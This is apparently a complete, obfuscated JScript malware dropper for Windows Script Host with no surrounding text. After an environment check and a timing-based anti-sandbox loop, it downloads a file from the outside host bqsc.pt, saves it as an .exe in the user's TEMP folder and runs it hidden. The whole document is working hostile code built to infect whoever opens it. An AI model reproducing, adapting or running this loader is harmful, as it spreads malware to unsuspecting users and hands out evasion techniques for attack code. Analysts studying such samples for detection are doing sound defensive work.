var _ON = false;
var _HT = "CreateObject";
var _L = function _Y() {return WScript[_HT]("WScript"+".Shell");}(), _AZ = 11;
var _V = "MSXML2.XMLHTTP";
var _K2 = 2123213;
var _R = 0;
function _OM(_KV){_L["Run"](_KV, _R, _R);};
function _FE(){return _V + "";};
function _SC(_HX, _X0){_R = _R * 1; return _HX - _X0;};
function _K0(){return _HT;};
/*@cc_on
  @if (@_win32 || @_win64)
    _ON = true;
  @end
@*/
if (_ON)
{
var _X = "";
function _K(){return 22;};
var _KP = 0; var _XU = 0;
function _M()
{
var _K1 = new this["Date"]();
var _BW = _K1["getUTCMilliseconds"]();
WScript["Sleep"](_K());
var _K1 = new this["Date"]();
var _WO = _K1["getUTCMilliseconds"]();
WScript["Sleep"](_K());
var _K1 = new this["Date"]();
var _T = _K1["getUTCMilliseconds"]();
var _KP = "_W";
_KP = _SC(_WO, _BW);
var _XU = "_WX";
_XU = _SC(_T, _WO);
_X = "open";
return _SC(_KP, _XU);
}
var _AF = false;
var _O = false;
for (var _BS = _R; _BS < _K() * 1; _BS++){if (_M() != _R){
_AF = true; 
_XU = "31" + 11 * _KP + _XU; 
_O = true; 
break;
}}
function _SB() {return ((_AF == true) && (_AF == _O)) ? 1 : _R;};
if (_AF && _SB() && _O){
function _P() {return _L["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "GuWKJ8Km.ex" + "e";};
 _E = _FE();
 _VU = WScript[_HT](_E);
 var _OJ = 1;
 while (_OJ){
try {
	if (_OJ == 1)
	{
		_VU[_X]("GET", "http://bqsc.pt/c6ska", false);
		_VU["send"]();
		_W0 = "Sleep";
	}
	WScript[_W0](_K() + 120); 
	if (_VU["readystate"] < 2 * 2) continue;
	_OJ = _R;
	function _C(_HU) {var _TA = (1, 2, 3, 4, 5, _HU); return _TA;};
	_XT = WScript[_K0()]("ADODB.Stream");
	_E = _XT;
	_E[_X]();
	_E["type"] = _C(1);
	_E["write"](_VU["ResponseBody"]);
	_XT["position"] = _C(_R);
	_E["Save" + "ToFile"](_P(), 2);
	_XT["cl"+"ose"]();
	_VW = _P();
	_OM(_VW);
} catch(_G){};
}
}
}

